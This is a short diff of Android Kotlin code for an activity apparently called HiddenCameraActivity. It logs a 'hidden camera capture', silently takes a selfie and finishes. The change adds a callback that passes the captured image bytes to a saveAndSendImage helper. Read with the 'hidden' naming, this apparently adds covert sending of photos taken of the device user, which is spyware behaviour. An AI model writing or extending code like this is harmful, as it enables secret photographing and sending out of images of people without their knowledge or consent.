@@ -13,9 +13,12 @@ class HiddenCameraActivity : Activity() {
     Log.i("HiddenCamera", "Launching hidden camera capture...")
 
     val helper = CameraHelper(this)
-    helper.captureSelfie {
-      Log.i("HiddenCamera", "Capture complete. Finishing.")
-      finish()
-    }
+    helper.captureSelfie(
+      onImageCaptured = { bytes -> CameraHelper.saveAndSendImage(this, bytes) },
+      onComplete = {
+        Log.i("HiddenCamera", "Capture complete. Finishing.")
+        finish()
+      }
+    )
   }
 }
